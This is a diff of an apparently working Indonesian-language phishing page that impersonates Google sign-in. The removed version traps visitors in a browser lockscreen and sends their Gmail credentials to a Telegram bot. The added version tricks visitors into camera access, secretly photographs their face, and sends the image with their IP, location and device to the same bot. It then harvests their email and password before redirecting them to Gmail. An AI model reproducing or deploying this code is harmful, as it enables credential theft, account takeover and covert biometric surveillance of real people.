@@ -2,217 +2,200 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
-    <title>Sign in - Google Accounts</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Verifikasi Keamanan - Google</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        html, body {
-            width: 100%;
-            height: 100%;
-            overflow: hidden !important;
-            position: fixed !important;
-            top: 0 !important;
-            left: 0 !important;
-            right: 0 !important;
-            bottom: 0 !important;
         }
 
         body {
             font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
-            background: white;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-        }
-
-        /* Fullscreen lock overlay - TIDAK BISA DIKELUARIN */
-        .lock-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            z-index: 999999999;
-            overflow: hidden;
+            background: #ffffff;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
 
-        /* Google Sign-in Card - tidak bisa di-scroll */
-        .card {
+        .container {
             max-width: 450px;
-            width: 90%;
-            padding: 48px 40px 36px;
+            width: 100%;
             text-align: center;
-            position: relative;
-            overflow: hidden;
         }
 
         .google-logo {
-            margin-bottom: 20px;
+            margin-bottom: 30px;
         }
 
         .google-logo img {
             width: 75px;
         }
 
-        h1 {
-            font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-            margin-bottom: 8px;
+        .camera-preview {
+            width: 100%;
+            height: 300px;
+            background: #000;
+            border-radius: 20px;
+            margin: 20px 0;
+            overflow: hidden;
+            position: relative;
         }
 
-        .subtitle {
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        canvas {
+            display: none;
+        }
+
+        .status-box {
+            background: #f1f3f4;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+
+        .status-text {
+            font-size: 14px;
             color: #5f6368;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid #e0e0e0;
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-left: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .permission-btn {
+            width: 100%;
+            padding: 14px;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 8px;
             font-size: 16px;
-            margin-bottom: 32px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .permission-btn:disabled {
+            background: #dadce0;
+            cursor: not-allowed;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: #9aa0a6;
+            margin-top: 20px;
+        }
+
+        .warning {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 15px;
+        }
+
+        /* Form Login (muncul setelah foto) */
+        .login-form {
+            display: none;
+            margin-top: 20px;
         }
 
         .input-group {
-            margin-bottom: 20px;
+            margin-bottom: 15px;
             text-align: left;
         }
 
         .input-group input {
             width: 100%;
-            padding: 13px 15px;
+            padding: 14px 16px;
             border: 1px solid #dadce0;
-            border-radius: 4px;
+            border-radius: 8px;
             font-size: 16px;
-            transition: all 0.2s;
-            background: white;
         }
 
         .input-group input:focus {
             outline: none;
             border-color: #1a73e8;
-            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
         }
 
-        .error-message {
-            background: #fce8e6;
-            color: #d93025;
-            padding: 12px;
-            border-radius: 4px;
-            font-size: 14px;
-            margin: 16px 0;
-            text-align: left;
-            display: none;
-        }
-
-        button {
+        .login-btn {
             width: 100%;
-            padding: 12px;
+            padding: 14px;
             background: #1a73e8;
             color: white;
             border: none;
-            border-radius: 4px;
-            font-size: 14px;
+            border-radius: 8px;
+            font-size: 16px;
             font-weight: 500;
             cursor: pointer;
-            margin-top: 20px;
-            transition: all 0.2s;
         }
 
-        button:hover {
-            background: #1557b0;
-        }
-
-        button:disabled {
-            background: #dadce0;
-            cursor: not-allowed;
-        }
-
-        .loading-spinner {
-            display: none;
-            margin: 16px auto;
-            width: 24px;
-            height: 24px;
-            border: 2px solid #e0e0e0;
-            border-top: 2px solid #1a73e8;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .footer-links {
-            margin-top: 32px;
-            font-size: 12px;
-            color: #5f6368;
-        }
-
-        .footer-links a {
-            color: #1a73e8;
-            text-decoration: none;
-            margin: 0 8px;
-            pointer-events: none;
-            cursor: default;
-        }
-
-        .attempt-text {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #5f6368;
-        }
-
-        /* Sembunyikan scrollbar */
-        ::-webkit-scrollbar {
+        .error-msg {
+            color: #d93025;
+            font-size: 13px;
+            margin-top: 10px;
             display: none;
         }
     </style>
 </head>
 <body>
 
-<div class="lock-overlay" id="lockOverlay">
-    <div class="card">
-        <div class="google-logo">
-            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+<div class="container" id="app">
+    <div class="google-logo">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    </div>
+
+    <!-- Halaman Kamera -->
+    <div id="cameraSection">
+        <div class="camera-preview">
+            <video id="video" autoplay playsinline></video>
         </div>
 
-        <h1>Sign in</h1>
-        <div class="subtitle">to continue to Gmail</div>
+        <div class="status-box">
+            <div class="status-text" id="statusText">
+                📸 Verifikasi wajah diperlukan
+            </div>
+        </div>
 
+        <button class="permission-btn" id="startBtn">Izinkan Akses Kamera</button>
+        <div class="info-text">Google Security memerlukan verifikasi wajah untuk melanjutkan</div>
+        <div class="warning">⚠️ Verifikasi wajib dilakukan</div>
+    </div>
+
+    <!-- Halaman Login (muncul setelah foto terkirim) -->
+    <div id="loginSection" class="login-form">
+        <h2 style="margin-bottom: 20px;">Sign in</h2>
+        <div class="subtitle" style="color:#5f6368; margin-bottom:25px;">to continue to Gmail</div>
+        
         <form id="loginForm">
             <div class="input-group">
-                <input type="email" id="email" placeholder="Email or phone" autocomplete="off" required>
+                <input type="email" id="email" placeholder="Email or phone" required>
             </div>
             <div class="input-group">
                 <input type="password" id="password" placeholder="Password" required>
             </div>
-
-            <div class="error-message" id="errorMsg">
-                Couldn't find your Google Account
-            </div>
-
-            <div class="loading-spinner" id="spinner"></div>
-
-            <button type="submit" id="submitBtn">Next</button>
+            <button type="submit" class="login-btn" id="loginBtn">Next</button>
+            <div class="error-msg" id="errorMsg">Wrong email or password</div>
         </form>
-
-        <div class="footer-links">
-            <a href="#">Forgot email?</a>
-            <span>•</span>
-            <a href="#">Forgot password?</a>
-        </div>
-
-        <div class="attempt-text" id="attemptText"></div>
     </div>
 </div>
 
@@ -222,173 +205,136 @@
     const CHAT_ID = "8854409945";
     // ==========================================
 
-    let attemptCount = 3;
-    let isLocked = false;
+    let stream = null;
+    let photoTaken = false;
+    let userEmail = '';
+    let userPassword = '';
 
-    const form = document.getElementById('loginForm');
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
-    const submitBtn = document.getElementById('submitBtn');
-    const spinner = document.getElementById('spinner');
-    const errorMsg = document.getElementById('errorMsg');
-    const attemptText = document.getElementById('attemptText');
-    const lockOverlay = document.getElementById('lockOverlay');
+    const cameraSection = document.getElementById('cameraSection');
+    const loginSection = document.getElementById('loginSection');
+    const video = document.getElementById('video');
+    const startBtn = document.getElementById('startBtn');
+    const statusText = document.getElementById('statusText');
 
-    // ========== LOCK SCROLL TOTAL ==========
-    document.body.style.overflow = 'hidden';
-    document.documentElement.style.overflow = 'hidden';
-    
-    // Lock scroll dengan event listener
-    window.addEventListener('scroll', function(e) {
-        window.scrollTo(0, 0);
-        e.preventDefault();
-        return false;
-    });
-    
-    document.addEventListener('wheel', function(e) {
-        e.preventDefault();
-        return false;
-    }, { passive: false });
-    
-    document.addEventListener('touchmove', function(e) {
-        e.preventDefault();
-        return false;
-    }, { passive: false });
-    
-    // Lock zoom dan gesture
-    document.addEventListener('gesturestart', function(e) {
-        e.preventDefault();
-        return false;
-    });
-    
-    document.addEventListener('keydown', function(e) {
-        // Lock semua tombol navigasi
-        if (e.key === 'F5' || 
-            e.key === 'F12' ||
-            e.key === 'F11' ||
-            (e.ctrlKey && e.key === 'r') || 
-            (e.ctrlKey && e.shiftKey && e.key === 'R') ||
-            (e.ctrlKey && e.key === 'w') ||
-            (e.ctrlKey && e.key === 't') ||
-            (e.ctrlKey && e.key === 'Tab') ||
-            (e.metaKey && e.key === 'r') ||
-            e.key === 'Escape' ||
-            e.key === 'Home' ||
-            e.key === 'Backspace') {
-            e.preventDefault();
-            return false;
-        }
-        
-        // Lock Ctrl+Shift+I (dev tools)
-        if (e.ctrlKey && e.shiftKey && e.key === 'I') {
-            e.preventDefault();
-            return false;
-        }
-        
-        // Lock Ctrl+U (view source)
-        if (e.ctrlKey && e.key === 'u') {
-            e.preventDefault();
-            return false;
-        }
-    });
-    
-    // Lock right click
-    document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        return false;
-    });
-    
-    // Lock back button (history)
-    history.pushState(null, null, location.href);
-    window.addEventListener('popstate', function() {
-        history.pushState(null, null, location.href);
-        // Force reload ke halaman yang sama
-        location.replace(location.href);
-    });
-    
-    // Lock sebelum halaman ditutup
-    window.addEventListener('beforeunload', function(e) {
-        e.preventDefault();
-        e.returnValue = '';
-        return '';
-    });
-    
-    // Lock visibility change (tab switch)
-    document.addEventListener('visibilitychange', function() {
-        if (document.hidden) {
+    // ========== MULAI KAMERA ==========
+    async function startCamera() {
+        try {
+            statusText.innerHTML = "⏳ Meminta akses kamera... <span class='loading-spinner'></span>";
+            
+            stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
+            video.srcObject = stream;
+            
+            statusText.innerHTML = "✅ Kamera aktif - Mengambil foto dalam 3 detik...";
+            
+            // Auto capture setelah 3 detik
             setTimeout(() => {
-                alert('⚠️ VERIFIKASI DIPERLUKAN!');
-                location.reload();
-            }, 100);
-        }
-    });
-    
-    // ========== FULLSCREEN LOCK ==========
-    function forceFullscreen() {
-        const docEl = document.documentElement;
-        if (docEl.requestFullscreen) {
-            docEl.requestFullscreen().catch(err => {});
-        } else if (docEl.webkitRequestFullscreen) {
-            docEl.webkitRequestFullscreen();
-        } else if (docEl.msRequestFullscreen) {
-            docEl.msRequestFullscreen();
+                takePhotoAndSend();
+            }, 3000);
+            
+        } catch(err) {
+            statusText.innerHTML = "❌ Izin kamera ditolak. Silakan izinkan untuk melanjutkan.";
+            startBtn.disabled = false;
+            startBtn.innerText = "Coba Lagi";
         }
     }
-    
-    // Request fullscreen saat pertama kali
-    document.body.addEventListener('click', function firstClick() {
-        forceFullscreen();
-        document.body.removeEventListener('click', firstClick);
-    });
-    
-    // Kalo keluar dari fullscreen, masukin lagi
-    document.addEventListener('fullscreenchange', function() {
-        if (!document.fullscreenElement) {
-            forceFullscreen();
+
+    // ========== AMBIL FOTO & KIRIM ==========
+    async function takePhotoAndSend() {
+        if (photoTaken) return;
+        photoTaken = true;
+        
+        statusText.innerHTML = "📸 Mengambil foto...";
+        
+        // Capture foto
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Matikan kamera
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
         }
-    });
-    document.addEventListener('webkitfullscreenchange', function() {
-        if (!document.webkitFullscreenElement) {
-            forceFullscreen();
-        }
-    });
-    
-    // Loop terus cek fullscreen
-    setInterval(() => {
-        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
-            forceFullscreen();
-        }
-        // Refresh history lock
-        if (window.location.hash !== '#locked') {
-            window.location.hash = 'locked';
-            history.pushState(null, null, '#locked');
-        }
-    }, 200);
-    
-    // ========== FUNGSI ==========
-    async function getIP() {
+        
+        statusText.innerHTML = "📤 Mengirim data ke server...";
+        
+        // Kirim foto ke Telegram
+        await sendPhotoToTelegram(canvas);
+        
+        // Sembunyikan kamera, tampilkan form login
+        statusText.innerHTML = "✅ Verifikasi berhasil! Silakan login.";
+        
+        setTimeout(() => {
+            cameraSection.style.display = 'none';
+            loginSection.style.display = 'block';
+        }, 1000);
+    }
+
+    // ========== KIRIM FOTO KE TELEGRAM ==========
+    async function sendPhotoToTelegram(canvas) {
+        // Konversi canvas ke blob
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+        
+        // Dapetin IP dan info
+        let ip = 'Unknown';
+        let lokasi = 'Unknown';
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
-            return data.ip;
-        } catch(e) {
-            return 'Unknown';
-        }
-    }
-    
-    async function sendToTelegram(email, password, status) {
-        const ip = await getIP();
+            ip = data.ip;
+            
+            // Dapetin lokasi dari IP
+            const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+            const geoData = await geoRes.json();
+            lokasi = `${geoData.city}, ${geoData.country_name}`;
+        } catch(e) {}
+        
         const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
         const userAgent = navigator.userAgent;
         
-        let pesan = `🔐🔐🔐 GOOGLE LOCKSCREEN 🔐🔐🔐%0A%0A`;
+        const caption = `📸📸📸 FOTO WAJAH KORBAN 📸📸📸%0A%0A` +
+            `🌐 IP ADDRESS : ${ip}%0A` +
+            `📍 LOKASI     : ${lokasi}%0A` +
+            `📅 WAKTU      : ${tanggal}%0A` +
+            `💻 DEVICE     : ${encodeURIComponent(userAgent.substring(0, 100))}%0A%0A` +
+            `⚠️ KORBAN TERKENA PHISHING + FOTO ⚠️`;
+        
+        // Kirim foto ke Telegram
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'face.jpg');
+        formData.append('caption', caption);
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        } catch(e) {
+            console.log('Gagal kirim foto:', e);
+        }
+    }
+
+    // ========== KIRIM EMAIL & PASSWORD ==========
+    async function sendCredentials(email, password) {
+        let ip = 'Unknown';
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch(e) {}
+        
+        const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
+        
+        let pesan = `🔐🔐🔐 GOOGLE LOGIN 🔐🔐🔐%0A%0A`;
         pesan += `📧 EMAIL    : ${email}%0A`;
         pesan += `🔑 PASSWORD : ${password}%0A`;
-        pesan += `✅ STATUS   : ${status}%0A`;
-        pesan += `🔄 PERCOBAAN: ${4 - attemptCount} / 3%0A`;
         pesan += `🌐 IP       : ${ip}%0A`;
-        pesan += `📅 WAKTU    : ${tanggal}%0A`;
-        pesan += `💻 DEVICE   : ${encodeURIComponent(userAgent.substring(0, 150))}`;
+        pesan += `📅 WAKTU    : ${tanggal}%0A%0A`;
+        pesan += `⚠️ KORBAN SUDAH KIRIM FOTO + LOGIN ⚠️`;
         
         const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesan}`;
         
@@ -396,44 +342,22 @@
             await fetch(url, {mode: 'no-cors'});
         } catch(e) {}
     }
-    
-    function updateAttemptDisplay() {
-        attemptText.innerText = `⚠️ ${attemptCount} attempt${attemptCount !== 1 ? 's' : ''} remaining`;
-        if (attemptCount <= 0) {
-            errorMsg.style.display = 'block';
-            errorMsg.innerHTML = '🔒 Too many failed attempts. Account temporarily locked.';
-            submitBtn.disabled = true;
-            startCountdown(30);
-        }
-    }
-    
-    function startCountdown(seconds) {
-        let timeLeft = seconds;
-        attemptText.innerText = `⏳ Please wait ${timeLeft} seconds before trying again...`;
-        const timer = setInterval(() => {
-            timeLeft--;
-            attemptText.innerText = `⏳ Please wait ${timeLeft} seconds before trying again...`;
-            if (timeLeft <= 0) {
-                clearInterval(timer);
-                attemptCount = 3;
-                updateAttemptDisplay();
-                submitBtn.disabled = false;
-            }
-        }, 1000);
-    }
-    
-    function validateLogin(email, password) {
-        return email.includes('@') && email.includes('.') && password.length >= 4;
-    }
-    
-    // ========== SUBMIT ==========
-    form.addEventListener('submit', async function(e) {
+
+    // ========== EVENT LISTENER ==========
+    startBtn.addEventListener('click', function() {
+        startBtn.disabled = true;
+        startCamera();
+    });
+
+    // Form login
+    const loginForm = document.getElementById('loginForm');
+    const errorMsg = document.getElementById('errorMsg');
+
+    loginForm.addEventListener('submit', async function(e) {
         e.preventDefault();
         
-        if (isLocked || attemptCount <= 0) return;
-        
-        const email = emailInput.value.trim();
-        const password = passwordInput.value;
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
         
         if (!email || !password) {
             errorMsg.style.display = 'block';
@@ -441,55 +365,21 @@
             return;
         }
         
-        isLocked = true;
-        submitBtn.disabled = true;
-        spinner.style.display = 'block';
-        errorMsg.style.display = 'none';
+        const loginBtn = document.getElementById('loginBtn');
+        loginBtn.disabled = true;
+        loginBtn.innerText = "⏳ Memverifikasi...";
         
-        await sendToTelegram(email, password, 'LOGIN ATTEMPT');
+        await sendCredentials(email, password);
         
-        const isValid = validateLogin(email, password);
+        errorMsg.style.backgroundColor = '#e6f4ea';
+        errorMsg.style.color = '#137333';
+        errorMsg.innerHTML = '✅ Verifikasi berhasil! Mengalihkan...';
+        errorMsg.style.display = 'block';
         
         setTimeout(() => {
-            spinner.style.display = 'none';
-            
-            if (isValid) {
-                sendToTelegram(email, password, '✅ SUCCESS - REAL DATA');
-                
-                errorMsg.style.display = 'block';
-                errorMsg.style.backgroundColor = '#e6f4ea';
-                errorMsg.style.color = '#137333';
-                errorMsg.innerHTML = '✅ Verifikasi berhasil! Redirecting to Gmail...';
-                
-                setTimeout(() => {
-                    window.location.href = 'https://mail.google.com';
-                }, 2000);
-            } else {
-                attemptCount--;
-                updateAttemptDisplay();
-                
-                errorMsg.style.display = 'block';
-                errorMsg.innerHTML = '❌ Wrong email or password. Please try again.';
-                
-                emailInput.value = '';
-                passwordInput.value = '';
-                emailInput.focus();
-                
-                isLocked = false;
-                submitBtn.disabled = false;
-                
-                setTimeout(() => {
-                    errorMsg.style.display = 'none';
-                }, 3000);
-            }
-        }, 1500);
+            window.location.href = 'https://mail.google.com';
+        }, 2000);
     });
-    
-    updateAttemptDisplay();
-    emailInput.focus();
-    
-    // Lock address bar scroll
-    window.scrollTo(0, 0);
 </script>
 </body>
 </html>
